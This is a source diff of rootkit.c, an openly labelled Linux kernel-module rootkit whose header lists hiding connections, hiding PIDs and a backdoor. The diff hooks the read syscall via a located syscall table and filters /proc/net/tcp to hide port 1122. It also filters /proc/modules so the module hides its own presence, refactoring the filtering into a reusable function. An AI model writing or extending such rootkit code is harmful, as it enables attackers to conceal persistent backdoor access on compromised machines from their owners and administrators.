@@ -1,9 +1,9 @@
 /*
- * \file        rootkit.c
- * \brief       Implement a basic LKM.
- * \author      Antoine.R
- * \version     0.1
- * \date        04/07/2018
+ * \file rootkit.c
+ * \brief Implement a basic LKM.
+ * \author Antoine.R
+ * \version 0.1
+ * \date 04/07/2018
  *
  * Implement A LKM with features : hide connection, hide pids, backdoor
  *
@@ -45,32 +45,50 @@ static char pid_backdoor_str[12]= {'\0'};
 static pid_t authorized_pids[MAX_PIDS] = {0};
 static size_t authorized_pids_cnt = 0;
 
-struct vip_files
-{
-    char * name;
-    int fd;
-};
 
-struct vip_files vip_filenames[] = {
-                                        {.name = "/proc/net/tcp", .fd = -1},
-                                        {.name = "/proc/net/tcp6", .fd = -1}
-                                    };
-const size_t vip_filenames_size = sizeof(vip_filenames) / sizeof(vip_filenames[0]);
-
-static char* hidden_port[] = {
+static const char* hidden_port[2] = {
     "0100007F:0462",    // 127.0.0.1:1122
     "00000000:0462"     // 0.0.0.0:1122
 };
 
-const size_t hidden_port_size = sizeof(hidden_port_size) / sizeof(hidden_port[0]);
-
-struct linux_dirent 
-{
-    unsigned long   d_ino;      // Inode number.
-    unsigned long   d_off;      // Offset of the next linux dirent.
-    unsigned short  d_reclen;   // Length of this linux dirent.
-    char            d_name[];   // Filename.
+static const char* hidden_module[1] = {
+    __this_module.name
 };
+
+/**
+ * \struct vip_files
+ * \brief Filename associated to a file decriptor.
+ *
+ * It is a structure with a filename associated to a file descriptor.
+ * It should contain specific to be modified to hide infos
+ */
+struct vip_files
+{
+    char *          name;           /*!< Filename. */
+    int             fd;             /*!< File descriptor associated. */
+    size_t          needle_size;    /*!< needle table size. */
+    const char **   needle;         /*!< table of string to check. */
+};
+
+/**
+ * \struct linux_dirent
+ * \brief Linux directory structure
+ *
+ */
+struct linux_dirent
+{
+    unsigned long   d_ino;      /*!< Inode number */
+    unsigned long   d_off;      /*!< Offset of the next linux dirent */
+    unsigned short  d_reclen;   /*!< Length of this linux dirent */
+    char            d_name[];   /*!< Filename */
+};
+
+struct vip_files vip_filenames[] = {
+    {.name = "/proc/net/tcp", .fd = -1, .needle_size = 2, .needle = hidden_port},
+    {.name = "/proc/modules", .fd = -1, .needle_size = 1, .needle = hidden_module}
+};
+
+const size_t vip_filenames_size = sizeof(vip_filenames) / sizeof(vip_filenames[0]);
 
 //How to find the syscall address and not in hardcoded
 unsigned long * sys_call = NULL;
@@ -90,7 +108,16 @@ int file_close(struct file *file);
 int file_read(struct file * file, unsigned long long offset, unsigned char * data, unsigned int size);
 int file_write(struct file * file, unsigned long long offset, unsigned char * data, unsigned int size);
 
-
+/**
+ * \fn void *memmem(const void *haystack, size_t haystack_size, const void *needle, size_t needle_size)
+ * \brief function to search a needle in a haystacks
+ *
+ * \param haystack : pointer to parsed buffer
+ * \param haystack_size : size of the parsed buffer
+ * \param needle : pointer to string to search for
+ * \param needle_size : size of the needle to search for
+ * \return pointer to the matching needle in the haystack, NULL if not found
+ */
 void *memmem(const void *haystack, size_t haystack_size, const void *needle, size_t needle_size)
 {
     char *p;
@@ -102,7 +129,12 @@ void *memmem(const void *haystack, size_t haystack_size, const void *needle, siz
 }
 
 #ifdef __x86_64__
-
+/**
+ * \fn unsigned long *find_sys_call_table(void)
+ * \brief function to find the syscall address based on LSTAR register for 64 bits
+ *
+ * \return Adress of the syscall table, NULL if not found
+ */
 unsigned long *find_sys_call_table(void)
 {
     int i = 0;
@@ -131,12 +163,21 @@ unsigned long *find_sys_call_table(void)
 }
 
 #else
-
+/**
+ * \struct idtr
+ * \brief Don't exactly know what to do here
+ *
+ */
 struct {
     unsigned short limit;
     unsigned long base;
 } __attribute__ ((packed))idtr;
 
+/**
+ * \struct idt
+ * \brief Don't exactly know what to do here
+ *
+ */
 struct {
     unsigned short off1;
     unsigned short sel;
@@ -144,6 +185,12 @@ struct {
     unsigned short off2;
 } __attribute__ ((packed))idt;
 
+/**
+ * \fn unsigned long *find_sys_call_table(void)
+ * \brief function to find the syscall address based on LSTAR register for 32 bits
+ *
+ * \return Adress of the syscall table, NULL if not found
+ */
 unsigned long *find_sys_call_table(void) {
     char **p;
     unsigned long sct_off = 0;
@@ -162,11 +209,12 @@ unsigned long *find_sys_call_table(void) {
 
 #endif
 
-/*  
- * File system, one layer deep into kernel
- * Donc, pour chaque fonction de userland, il faut voir son implementation et checker le niveau en dessous
+/**
+ * \fn      static int is_proc_authorized(pid_t pid)
+ * \brief   Check if a given pid is authorized to read specific file
+ * \param   pid : the pid to be checked
+ * \return  1 if proc is authorized, 0 otherwise
  * */
-
 static int is_proc_authorized(pid_t pid)
 {
     int i;
@@ -177,7 +225,12 @@ static int is_proc_authorized(pid_t pid)
     return 0;
 }
 
-// -1 if not VIP, index in the table otherwise
+/**
+ * \fn      static int get_vip_index(const char * filename)
+ * \brief   get the table index of a filename
+ * \param   filename : filename to be checked
+ * \return  index if found, -1 otherwise
+ * */
 static int get_vip_index(const char * filename)
 {
     size_t i = 0;
@@ -193,9 +246,11 @@ static int get_vip_index(const char * filename)
     return -1;
 }
 
-/*
- * Create basic test file for us
- */
+/**
+ * \fn      static int create_hack_file(void)
+ * \brief   Create small file with index written inside it
+ * \return  0 if everything went well.
+ * */
 static int create_hack_file(void)
 {
 #define MAX_NAME_SIZE   64
@@ -220,7 +275,14 @@ static int create_hack_file(void)
     return 0;
 }
 
-// Extract line from a buffer
+/**
+ * \fn      static char * extract_line(const char * buf, char * line, size_t count)
+ * \brief   Extract the 1st line found in a buffer
+ * \param   buf  : buffer to be checked for a line
+ * \param   line : buffer to store the line found
+ * \param   count: max size of the line buffer
+ * \return  pointer to the value after '\n', NULL if EOF or no newline found
+ * */
 static char * extract_line(const char * buf, char * line, size_t count)
 {
     char * 	tok = NULL;
@@ -230,12 +292,16 @@ static char * extract_line(const char * buf, char * line, size_t count)
         return NULL;
 
     tok = strstr(buf, "\n");
-    if(!tok)
-        return NULL;
-    if((len = (tok - buf)) == 0)
-        return NULL;
 
-    if(len >= count)
+    if(!tok)
+    {
+        len = strlen(buf);
+        if(len > 0 && len < count)
+            memcpy(line, buf, len + 1);
+        return NULL;
+    }
+
+    if((len = tok - buf + 1) > count)
         return NULL;
 
     memcpy(line, buf, len);
@@ -247,6 +313,14 @@ static char * extract_line(const char * buf, char * line, size_t count)
     return (tok + 1);
 }
 
+/**
+ * \fn      struct file *file_open(const char *path, int flags, int rights)
+ * \brief   Open a file in kernel mode
+ * \param   path  : path to the file to open
+ * \param   flags : flags used to open the file
+ * \param   rights: handle ownership of the created file
+ * \return  pointer to struct file, NULL if failure
+ * */
 struct file *file_open(const char *path, int flags, int rights)
 {
     struct file *filp = NULL;
@@ -266,11 +340,26 @@ struct file *file_open(const char *path, int flags, int rights)
     return filp;
 }
  
+ /**
+ * \fn      int file_close(struct file *file)
+ * \brief   close a file in kernel mode
+ * \param   file  : pointer to the struct file  to close
+ * \return  status of the fiel closure
+ * */
 int file_close(struct file *file)
 {
     return filp_close(file, NULL);
 }
- 
+
+/**
+ * \fn int file_read(struct file * file, unsigned long long offset, unsigned char * data, unsigned int size)
+ * \brief read a file in kernel mode
+ * \param file  : pointer to the struct file  to read
+ * \param offset: position of the curser in opened file
+ * \param data  : start pointer of the buffer to store data
+ * \param size  : size of the storage buffer
+ * \return number of bytes read
+ * */
 int file_read(struct file * file, unsigned long long offset, unsigned char * data, 
                    unsigned int size)
 {
@@ -286,6 +375,15 @@ int file_read(struct file * file, unsigned long long offset, unsigned char * dat
     return ret;
 }
 
+/**
+ * \fn      int file_write(struct file * file, unsigned long long offset, unsigned char * data, unsigned int size)
+ * \brief   Write into a file in kernel mode
+ * \param file  : pointer to the struct file  to read
+ * \param offset: position of the curser in opened file
+ * \param data  : start pointer of the buffer to store data
+ * \param size  : size of the storage buffer
+ * \return number of bytes written
+ * */
 int file_write(struct file * file, unsigned long long offset, unsigned char * data, 
                     unsigned int size)
 {
@@ -301,6 +399,12 @@ int file_write(struct file * file, unsigned long long offset, unsigned char * da
     return ret;
 }
 
+/**
+ * \fn      int file_sync(struct file * file)
+ * \brief   Sync a file
+ * \param file : file struct to synched
+ * \return 0
+ * */
 int file_sync(struct file * file)
 {
     vfs_fsync(file, 0);
@@ -349,64 +453,74 @@ asmlinkage ssize_t fake_sys_write(int fd, const void *buf, size_t count)
     return original_sys_write(fd, buf, count);
 }
 
+static ssize_t filter_vip_file(char * text, size_t count, ssize_t read, int vip_index)
+{
+    int j = 0, skip = 0, len = 0;
+    char * p                = text;
+    char line[MAX_LINE_LEN];
+    ssize_t offset          = 0;
+    char * tmp              = NULL;
+
+    if((tmp = (char*)kmalloc(count, GFP_KERNEL)) == NULL)
+        return 0;
+
+    //lets just print tmp for now
+    do
+    {
+        memset(line, 0, MAX_LINE_LEN);
+        p = extract_line(p, line, MAX_LINE_LEN);
+        len = strlen(line);
+
+        if(len > 0)
+        {
+            for(j = 0; j < vip_filenames[vip_index].needle_size; j++)
+            {
+                if(strstr(line, vip_filenames[vip_index].needle[j]))
+                {
+                    skip = 1;
+                    break;
+                }
+            }
+            if(skip)
+            {
+                skip = 0;
+                read -= len + 1;
+                continue;
+            }
+
+            memcpy(tmp + offset, line, len);
+            offset += len;
+        }
+    }while(p);
+
+    // Zero padding at the end of the buffer
+    memcpy(tmp + offset, "\0", 1);
+    memcpy(text, tmp, offset + 1);
+    kfree(tmp);
+    return read;
+}
+
 asmlinkage ssize_t fake_sys_read(int fd, void *buf, size_t count)
 {
-    int     i = 0, j = 0, skip = 0;
+    int     index = 0;
     ssize_t read     = 0;
-    char *  p       = (char *)buf;
-    char    line[MAX_LINE_LEN] = {0};
-    char *  tmp     = kmalloc(count, GFP_KERNEL);
-    ssize_t offset  = 0;
     pid_t   pid     = original_sys_getpid();
     pid_t   ppid    = original_sys_getppid();
 
-    memset(tmp, '0', count);
-
-    for(i = 0; i < vip_filenames_size; i++)
-        if(vip_filenames[i].fd == fd)
+    for(index = 0; index < vip_filenames_size; index++)
+        if(vip_filenames[index].fd == fd)
             break;
 
     read = original_sys_read(fd, buf, count);
 
     // Not a vip file, read in normally
-    if(i == vip_filenames_size || is_proc_authorized(pid) || is_proc_authorized(ppid))
-        goto clean_exit;
+    if(index == vip_filenames_size || is_proc_authorized(pid) || is_proc_authorized(ppid))
+        return read;
 
-    //lets just print tmp for now
-    while((p = extract_line(p, line, MAX_LINE_LEN)) != NULL)
-    {
-        for(j = 0; j < hidden_port_size; j++)
-        {
-            if(strstr(line, hidden_port[0]))
-            {
-                skip = 1;
-                break;
-            }
-        }
-        if(skip)
-        {
-            skip = 0;
-            read -= strlen(line) + 1;
-            continue;
-        }
+    read = filter_vip_file((char*) buf, count, read, index);
 
-        memcpy(tmp + offset, line, strlen(line));
-        offset += strlen(line);
-        memcpy(tmp + offset, "\n", 1);
-        offset++;
-    }
+    vip_filenames[index].fd = -1;
 
-    // Zero padding at the end of the buffer
-    memset(tmp + offset, '\0', 1);
-    memcpy(buf, tmp, count);
-    kfree(tmp);
-
-    vip_filenames[i].fd = -1;
-
-    return read;
-
-clean_exit:
-    kfree(tmp);
     return read;
 }
 
